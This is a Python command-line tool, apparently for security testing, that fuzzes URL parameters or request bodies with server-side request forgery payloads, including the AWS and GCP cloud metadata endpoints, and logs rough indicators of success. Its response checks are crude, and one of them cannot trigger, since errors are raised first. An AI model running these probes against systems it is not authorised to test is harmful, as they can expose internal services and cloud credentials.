#!/usr/bin/env python3
import argparse
import logging
import requests
import sys
import urllib.parse
from typing import List, Dict, Tuple

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# SSRF Payloads - Internal IP Addresses, Blocked External Sites
SSRF_PAYLOADS: List[str] = [
    "http://127.0.0.1",
    "http://localhost",
    "http://169.254.169.254",  # AWS Metadata
    "http://metadata.google.internal", # GCP Metadata
    "http://example.com",  # Blocked external site example
    "http://0.0.0.0"
]

def setup_argparse() -> argparse.ArgumentParser:
    """
    Sets up the argument parser for the vuln-SSRF-Fuzzer tool.

    Returns:
        argparse.ArgumentParser: The configured argument parser.
    """
    parser = argparse.ArgumentParser(description="SSRF Fuzzer - Detect Server-Side Request Forgery vulnerabilities.")
    parser.add_argument("url", help="The target URL to fuzz.")
    parser.add_argument("-p", "--params", nargs='+', help="List of parameters to fuzz in the URL. If not provided, fuzz all query parameters.")
    parser.add_argument("-d", "--data", help="Request body data (e.g., JSON or form data) to fuzz.  Specify a parameter to fuzz with the PAYLOAD marker, e.g., '{\"param1\": \"PAYLOAD\", \"param2\": \"value2\"}'")
    parser.add_argument("-H", "--headers", nargs='+', help="Custom headers to include in the request (e.g., 'Content-Type: application/json').")
    parser.add_argument("-m", "--method", default="GET", choices=["GET", "POST"], help="HTTP method to use (default: GET).")
    parser.add_argument("-t", "--timeout", type=int, default=5, help="Request timeout in seconds (default: 5).")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output (debug logging).")
    return parser


def fuzz_url_params(url: str, params_to_fuzz: List[str] = None, timeout: int = 5) -> None:
    """
    Fuzzes URL parameters with SSRF payloads.

    Args:
        url (str): The URL to fuzz.
        params_to_fuzz (List[str], optional): A list of parameters to specifically fuzz. If None, all query parameters are fuzzed. Defaults to None.
        timeout (int, optional): Request timeout in seconds. Defaults to 5.
    """
    try:
        parsed_url = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed_url.query)

        if not query_params:
            logging.info("No query parameters found in the URL.")
            return

        if params_to_fuzz:
            params_to_fuzz = [param.strip() for param in params_to_fuzz]
            params_to_fuzz = [param for param in params_to_fuzz if param in query_params]
            if not params_to_fuzz:
                logging.warning("Specified parameters not found in URL. Exiting.")
                return
        else:
            params_to_fuzz = list(query_params.keys())  # Fuzz all if none provided.

        for param in params_to_fuzz:
            for payload in SSRF_PAYLOADS:
                fuzzed_query_params = query_params.copy()
                fuzzed_query_params[param] = [payload]
                encoded_query_string = urllib.parse.urlencode(fuzzed_query_params, doseq=True)
                fuzzed_url = parsed_url._replace(query=encoded_query_string).geturl()

                logging.info(f"Fuzzing URL: {fuzzed_url}")
                try:
                    response = requests.get(fuzzed_url, timeout=timeout)
                    response.raise_for_status()  # Raise HTTPError for bad responses (4xx or 5xx)
                    logging.info(f"Response Status Code: {response.status_code}")
                    #Example Response Analysis
                    if response.status_code != 200:
                        logging.warning(f"Non-200 status code received.  Possible SSRF Indicator. Status Code: {response.status_code}")
                    if "Example Domain" in response.text:
                        logging.warning(f"Example Domain found. Possible SSRF Indicator.")
                    if "127.0.0.1" in response.text:
                         logging.warning(f"Localhost found. Possible SSRF Indicator.")
                    # Add more response analysis here
                except requests.exceptions.RequestException as e:
                    logging.error(f"Request failed: {e}")

    except Exception as e:
        logging.error(f"An error occurred while fuzzing URL parameters: {e}")

def fuzz_request_body(url: str, data: str, method: str = "POST", headers: Dict[str, str] = None, timeout: int = 5) -> None:
    """
    Fuzzes the request body with SSRF payloads.  Looks for the "PAYLOAD" marker.

    Args:
        url (str): The URL to send the request to.
        data (str): The request body data containing the "PAYLOAD" marker.
        method (str, optional): The HTTP method to use (default: POST).
        headers (Dict[str, str], optional): Custom headers to include (default: None).
        timeout (int, optional): Request timeout in seconds. Defaults to 5.
    """
    if "PAYLOAD" not in data:
        logging.error("The request body does not contain the 'PAYLOAD' marker. Exiting.")
        return

    for payload in SSRF_PAYLOADS:
        fuzzed_data = data.replace("PAYLOAD", payload)
        logging.info(f"Fuzzing data: {fuzzed_data}")
        try:
            if method == "GET":
                response = requests.get(url, params=fuzzed_data, headers=headers, timeout=timeout)
            else: # POST
                response = requests.post(url, data=fuzzed_data, headers=headers, timeout=timeout)

            response.raise_for_status()
            logging.info(f"Response Status Code: {response.status_code}")
            #Example Response Analysis
            if response.status_code != 200:
                logging.warning(f"Non-200 status code received.  Possible SSRF Indicator. Status Code: {response.status_code}")
            if "Example Domain" in response.text:
                logging.warning(f"Example Domain found. Possible SSRF Indicator.")
            if "127.0.0.1" in response.text:
                 logging.warning(f"Localhost found. Possible SSRF Indicator.")
             # Add more response analysis here

        except requests.exceptions.RequestException as e:
            logging.error(f"Request failed: {e}")
        except Exception as e:
            logging.error(f"An error occurred while fuzzing the request body: {e}")

def parse_headers(headers: List[str]) -> Dict[str, str]:
    """Parses a list of header strings into a dictionary.

    Args:
        headers (List[str]): A list of header strings in the format "Header-Name: Header-Value".

    Returns:
        Dict[str, str]: A dictionary of headers.
    """
    header_dict = {}
    if headers:
        for header in headers:
            try:
                name, value = header.split(":", 1)
                header_dict[name.strip()] = value.strip()
            except ValueError:
                logging.error(f"Invalid header format: {header}. Expected 'Header-Name: Header-Value'. Ignoring.")
    return header_dict

def main():
    """
    Main function of the vuln-SSRF-Fuzzer tool.
    """
    parser = setup_argparse()
    args = parser.parse_args()

    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)

    logging.debug(f"Arguments: {args}")

    try:
        if args.data:
            headers = parse_headers(args.headers) if args.headers else None
            fuzz_request_body(args.url, args.data, args.method, headers, args.timeout)
        else:
            fuzz_url_params(args.url, args.params, args.timeout)
    except Exception as e:
        logging.error(f"An unhandled error occurred: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()